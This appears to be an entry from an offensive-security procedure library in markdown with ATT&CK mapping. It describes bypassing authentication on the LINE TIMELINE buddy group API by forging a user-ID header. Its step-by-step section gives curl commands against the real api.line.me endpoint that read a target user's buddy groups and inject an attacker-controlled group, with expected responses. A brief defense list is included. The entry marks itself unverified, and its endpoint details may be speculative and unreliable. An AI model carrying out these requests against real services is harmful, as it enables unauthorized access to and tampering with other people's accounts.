---
tags:
  - auth-bypass
  - api
  - header-manipulation
  - line-timeline
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-bypass-auth-headers]]'
platforms:
  - Web
  - API
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 87d2a2ce-3ba3-461b-a378-cc32d80dcff5
created_at: '2025-12-14T17:32:29.366Z'
updated_at: '2025-12-14T17:32:29.366Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Authentication-via-API-Header-Manipulation

## Summary

This procedure exploits a flaw in the authentication logic of the LINE TIMELINE buddy group API, allowing attackers to bypass checks by manipulating request headers, resulting in unauthorized access to another user's buddy groups for inquiry and modification.

## Description

The vulnerability stems from improper validation of authentication headers in the buddy group API endpoints. By altering headers such as Authorization or custom user-ID fields, an attacker can impersonate any user without valid credentials. This enables querying the list of buddy groups and even modifying them, potentially leading to data exposure or account compromise. The attack targets the Web API platform of LINE TIMELINE and requires basic knowledge of HTTP requests and API structures. Expected outcomes include retrieving sensitive group data or injecting malicious entries.

## Requirements

1. Access to the LINE TIMELINE API endpoints over HTTPS
2. Knowledge of the target user's ID or session context (obtainable via other means like social engineering or prior leaks)
3. Tool for sending custom HTTP requests, such as curl
4. Valid base authentication token if initial access is partially authenticated

## Defense

Defensive measures and detection strategies:

- Implement strict header validation and token-based authentication with signature verification
- Use rate limiting and IP-based anomaly detection on API calls
- Log and monitor unusual header patterns or access to buddy groups from unexpected sources
- Enforce server-side user identity checks independent of client-supplied headers

## Objectives

1. Gain unauthorized read access to target user's buddy groups
2. Enable modification of buddy group lists for persistence or disruption
3. Demonstrate the impact of flawed authentication logic on user privacy

## Instructions

### Step 1: Identify Target API Endpoint and User Context

**Context**: Determine the buddy group API endpoint (e.g., /timeline/buddygroups) and obtain the target user's ID through reconnaissance or public sources.

No specific command required here; use browser developer tools or API documentation to confirm the endpoint.

### Step 2: Craft and Send Manipulated Header Request

**Context**: Use [[commands/curl-bypass-auth-headers]] to send a GET request with altered headers, bypassing the authentication logic to retrieve buddy groups.

**Command** ([[commands/curl-bypass-auth-headers]]):
```bash
curl -X GET "https://api.line.me/timeline/buddygroups" \
  -H "Authorization: Bearer manipulated_token" \
  -H "X-User-ID: target_user_id" \
  -H "Content-Type: application/json"
```

> This command exploits the bug by setting a forged X-User-ID header to impersonate the target, while using a minimal or invalid Authorization token. Expected output is a JSON array of buddy groups if successful, e.g., {"groups": [{"id": 123, "name": "friends", "members": ["user1"]}]}.

### Step 3: Verify and Modify Buddy Groups

**Context**: If access is granted, follow up with a POST request to modify the groups, confirming the bypass.

**Command** ([[commands/curl-bypass-auth-headers]]):
```bash
curl -X POST "https://api.line.me/timeline/buddygroups" \
  -H "Authorization: Bearer manipulated_token" \
  -H "X-User-ID: target_user_id" \
  -H "Content-Type: application/json" \
  -d '{"group_name": "malicious_group", "members": ["attacker_id"]}'
```

> This adds a new group or modifies existing ones. Success is indicated by a 200 OK response with confirmation, e.g., {"status": "created", "group_id": 456}.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-bypass-auth-headers]]

## Tools Used


## Tags

- [[auth-bypass]]
- [[api]]
- [[header-manipulation]]
- [[line-timeline]]
